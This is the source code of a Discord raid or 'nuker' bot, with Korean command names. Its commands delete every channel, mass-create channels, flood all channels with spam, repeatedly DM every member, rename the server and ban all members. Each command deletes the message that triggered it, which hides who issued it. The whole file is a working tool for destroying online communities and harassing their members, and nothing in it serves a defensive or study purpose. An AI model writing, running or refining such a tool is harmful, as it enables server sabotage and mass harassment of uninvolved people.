import os
import asyncio
import datetime
import discord
from discord.ext import commands

CONFIG_FILE = "config.txt"
TOKEN_PREFIX = "DISCORD-BOT-TOKEN="

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def log(message):
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"[{now}] {message}")

def get_or_create_token():
    if not os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, "w", encoding="utf-8") as f:
            f.write(f"{TOKEN_PREFIX}여기에_봇_토큰을_입력하세요\n")
        print(f"'{CONFIG_FILE}' 파일이 생성되었습니다. 파일 안의 토큰을 수정한 뒤 다시 실행하세요.")
        exit()

    with open(CONFIG_FILE, "r", encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            if line.startswith(TOKEN_PREFIX):
                token = line.split("=", 1)[1].strip()
                if token and token != "여기에_봇_토큰을_입력하세요":
                    return token

    print(f"'{CONFIG_FILE}'에서 올바른 토큰을 찾지 못했습니다. 토큰을 입력해 주세요.")
    exit()

TOKEN = get_or_create_token()

allowed_mentions = discord.AllowedMentions(everyone=True, roles=True, users=True)

intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.members = True

# 기본 help 명령어 충돌 방지를 위해 help_command=None 설정
bot = commands.Bot(command_prefix=".", intents=intents, allowed_mentions=allowed_mentions, help_command=None)

@bot.event
async def on_ready():
    clear_screen()
    ascii_art = r"""
 _____ _____ _____ _____ _____ __        __ __     _____ 
|  |  |   __| __  |   | |   __|  |   ___|  |  |   |  _  |
|  --|   __|  --| | | |   __|  |__|___|-   -|  |   |  __ |
|__|__|_____|__|__|_|___|_____|_____|   |__|__|   |__|  

------------------------------------------------------------"""
    print(ascii_art)
    log(f"LOGGED IN AS: {bot.user.name} ({bot.user.id})")

async def delete_trigger_message(ctx):
    try:
        await ctx.message.delete()
    except Exception as e:
        log(f"[WARN] 명령어 메시지 삭제 실패: {e}")

@bot.command(name="명령어")
async def show_help(ctx):
    log(f"[REQUEST] User: {ctx.author} | Server: {ctx.guild.name} | 명령어 목록 요청")
    
    help_text = (
        "```\n"
        "명령어 목록\n"
        ".명령어 (명령어 목록)\n"
        ".채널생성 (개수) (채널 이름)\n"
        ".채널삭제 (모든 채널 삭제)\n"
        ".메시지도배 (채널당 개수) (메시지)\n"
        ".DM (횟수) (메시지)\n"
        ".서버이름변경 (새로운 서버 이름)\n"
        ".올밴 (서버 전체 인원 밴)\n"
        "```"
    )

    try:
        await ctx.send(help_text)
    except Exception as e:
        log(f"[FAILED] 명령어 목록 전송 실패: {e}")
    finally:
        await delete_trigger_message(ctx)

async def send_single_message(channel, message_text, index):
    try:
        await channel.send(message_text)
        log(f"[SUCCESS] Message sent successfully (#{channel.name} - {index}th)")
        return True
    except Exception as e:
        log(f"[FAILED] Message sending failed (#{channel.name}) - Reason: {e}")
        return False

async def spam_channel(channel, count, message_text):
    success_count = 0
    for i in range(count):
        res = await send_single_message(channel, message_text, i + 1)
        if res:
            success_count += 1
        await asyncio.sleep(0.1)
    return success_count

@bot.command(name="메시지도배")
@commands.has_permissions(send_messages=True)
async def spam_messages(ctx, count: int, *, message_text: str):
    await delete_trigger_message(ctx)
    if count <= 0:
        log(f"[WARN] 잘못된 수량 입력: {count}")
        return

    guild = ctx.guild
    text_channels = guild.text_channels
    log(f"[REQUEST] User: {ctx.author} | Server: {guild.name} | Message spamming requested ({count} messages per channel, total {len(text_channels)} channels)")

    tasks = [spam_channel(ch, count, message_text) for ch in text_channels]
    results = await asyncio.gather(*tasks)
    total_sent = sum(results)
    log(f"[COMPLETE] Message spamming completed: Total {total_sent} messages sent")

async def send_dm_to_member(member, count, message_text):
    if member.bot:
        return 0
    
    success_count = 0
    for i in range(count):
        try:
            await member.send(message_text)
            log(f"[SUCCESS] DM sent to {member} ({i + 1}/{count})")
            success_count += 1
            await asyncio.sleep(0.1)
        except Exception as e:
            log(f"[FAILED] DM failed for {member} - Reason: {e}")
            break  # DM이 차단된 경우 반복 중단
    return success_count

@bot.command(name="DM")
async def send_dm_all(ctx, count: int, *, message_text: str):
    await delete_trigger_message(ctx)
    if count <= 0:
        log(f"[WARN] 잘못된 수량 입력: {count}")
        return

    guild = ctx.guild
    members = guild.members
    log(f"[REQUEST] User: {ctx.author} | Server: {guild.name} | DM spamming requested ({count} times per member, total {len(members)} members)")

    tasks = [send_dm_to_member(m, count, message_text) for m in members]
    results = await asyncio.gather(*tasks)
    total_sent = sum(results)
    log(f"[COMPLETE] DM spamming completed: Total {total_sent} DMs sent")

@bot.command(name="서버이름변경")
@commands.has_permissions(manage_guild=True)
async def change_server_name(ctx, *, new_name: str = None):
    await delete_trigger_message(ctx)
    
    if not new_name:
        log("[WARN] You did not enter a server name. To connect: .server_rename [new_name]")
        return

    old_name = ctx.guild.name
    log(f"[REQUEST] User: {ctx.author} | Server: {old_name} | Server name change requested -> '{new_name}'")

    try:
        await ctx.guild.edit(name=new_name)
        log(f"[SUCCESS] Server name changed successfully: '{old_name}' -> '{new_name}'")
    except discord.Forbidden:
        log("[FAILED] Server name change failed - The bot does not have 'Manage Server' permission.")
    except Exception as e:
        log(f"[FAILED] Server name change failed - Reason: {e}")

async def ban_single_member(guild, member):
    if member == bot.user or member == guild.owner:
        return False
    try:
        await guild.ban(member, reason="올밴 명령어 실행")
        log(f"[SUCCESS] Member banned successfully: {member} (ID: {member.id})")
        return True
    except Exception as e:
        log(f"[FAILED] Failed to ban member: {member} - Reason: {e}")
        return e

@bot.command(name="올밴")
@commands.has_permissions(ban_members=True)
async def ban_all_members(ctx):
    await delete_trigger_message(ctx)
    guild = ctx.guild
    members = guild.members
    total_members = len(members)

    log(f"[REQUEST] User: {ctx.author} | Server: {guild.name} | Ban all members requested (Target: {total_members} members)")
    tasks = [ban_single_member(guild, member) for member in members]
    results = await asyncio.gather(*tasks)
    success_count = sum(1 for res in results if res is True)
    log(f"[COMPLETE] Ban all members completed: Total {success_count} members banned")

async def create_single_channel(guild, channel_name):
    try:
        channel = await guild.create_text_channel(name=channel_name)
        log(f"[SUCCESS] Channel created successfully: #{channel.name} (ID: {channel.id})")
        return channel
    except Exception as e:
        log(f"[FAILED] Failed to create channel: #{channel_name} - Reason: {e}")
        return e

@bot.command(name="채널생성")
@commands.has_permissions(manage_channels=True)
async def create_channels(ctx, count: int, *, channel_name: str):
    await delete_trigger_message(ctx)
    if count <= 0:
        log(f"[WARN] 잘못된 수량 입력: {count}")
        return

    log(f"[REQUEST] User: {ctx.author} | Server: {ctx.guild.name} | 요청: '{channel_name}' 채널 {count}개 생성")

    tasks = [create_single_channel(ctx.guild, channel_name) for _ in range(count)]
    results = await asyncio.gather(*tasks)
    success_count = sum(1 for res in results if isinstance(res, discord.TextChannel))
    log(f"[COMPLETE] Channel creation completed: Total {success_count} / {count} created successfully")

async def delete_single_channel(channel):
    try:
        channel_name = channel.name
        await channel.delete()
        log(f"[SUCCESS] 채널 삭제: #{channel_name}")
        return True
    except Exception as e:
        log(f"[FAILED] 채널 삭제 실패: #{channel.name} - 사유: {e}")
        return e

@bot.command(name="채널삭제")
@commands.has_permissions(manage_channels=True)
async def delete_all_channels(ctx):
    await delete_trigger_message(ctx)
    guild = ctx.guild
    channels = list(guild.channels)
    total_count = len(channels)

    log(f"[REQUEST] User: {ctx.author} | Server: {guild.name} | 모든 채널 삭제 요청 ({total_count}개 채널)")

    tasks = [delete_single_channel(ch) for ch in channels]
    results = await asyncio.gather(*tasks)
    success_count = sum(1 for res in results if res is True)

    log(f"[COMPLETE] 모든 채널 삭제 완료: 총 {success_count} / {total_count}개 삭제됨")

    try:
        new_ch = await guild.create_text_channel(name="새로운-채널")
        log(f"[SUCCESS] 모든 채널 삭제 후 기본 채널 생성 완료: #{new_ch.name}")
    except Exception as e:
        log(f"[FAILED] 삭제 후 기본 채널 생성 실패: {e}")

@show_help.error
@spam_messages.error
@send_dm_all.error
@ban_all_members.error
@change_server_name.error
@create_channels.error
@delete_all_channels.error
async def command_error(ctx, error):
    log(f"[ERROR] 명령어 실행 중 에러 발생 (유저: {ctx.author}): {error}")

bot.run(TOKEN)